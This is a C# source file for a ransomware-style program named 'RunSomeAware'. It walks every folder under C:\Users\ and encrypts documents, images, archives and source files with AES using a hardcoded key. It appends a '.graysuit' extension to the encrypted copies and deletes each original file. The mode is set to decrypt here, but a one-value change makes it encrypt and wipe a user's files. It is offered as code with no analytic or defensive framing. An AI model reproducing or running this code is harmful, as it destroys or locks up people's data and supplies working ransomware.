using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class RunSomeAware
{
	public enum Mode
	{
		Encrypt = 1,
		Decrypt = 0
	}

	public static string key = "MyPrivateKey";

	public static string CrypterExt = ".graysuit";

	public static string ParentDirectory = "C:\\Users\\";

	public static string[] AllowedExt = new string[7] { ".png", ".html", ".7z", ".cpp", ".js", ".txt", CrypterExt };

	public static Mode mode = Mode.Decrypt;

	public static long BytesRead = 0L;

	public static void Main()
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		Start(ParentDirectory);
		stopwatch.Stop();
		Console.WriteLine("Speed:" + (double)BytesRead / ((double)stopwatch.ElapsedMilliseconds * 0.001 * 1024.0 * 1024.0) + " MB/s");
	}

	private static void Start(string ParentDir)
	{
		string[] files = Directory.GetFiles(ParentDir);
		foreach (string text in files)
		{
			if (Contain(new FileInfo(text).Extension, AllowedExt))
			{
				Crypt(text, mode);
				BytesRead += new FileInfo(text).Length;
				File.Delete(text);
				Console.WriteLine((text.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + text);
			}
		}
		files = Directory.GetDirectories(ParentDir);
		foreach (string parentDir in files)
		{
			try
			{
				Start(parentDir);
			}
			catch
			{
			}
		}
	}

	private static void Crypt(string file, Mode mode)
	{
		if (mode == Mode.Encrypt && file.EndsWith(CrypterExt))
		{
			throw new Exception("Error! File is already encrypted. FilePath:" + file);
		}
		using FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read);
		using FileStream stream = new FileStream((mode == Mode.Decrypt) ? file.Replace(CrypterExt, "") : (file + CrypterExt), FileMode.Create, FileAccess.Write);
		using Rijndael rijndael = new RijndaelManaged();
		rijndael.Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(key));
		rijndael.Mode = CipherMode.ECB;
		using CryptoStream cryptoStream = new CryptoStream(stream, (mode == Mode.Decrypt) ? rijndael.CreateDecryptor() : rijndael.CreateEncryptor(), CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		while (fileStream.Read(array, 0, array.Length) > 0)
		{
			cryptoStream.Write(array, 0, array.Length);
		}
	}

	private static bool Contain(string value, string[] values)
	{
		int num = 0;
		while (true)
		{
			if (num < values.Length)
			{
				string text = values[num];
				if (text.Trim() == value.Trim())
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}
}
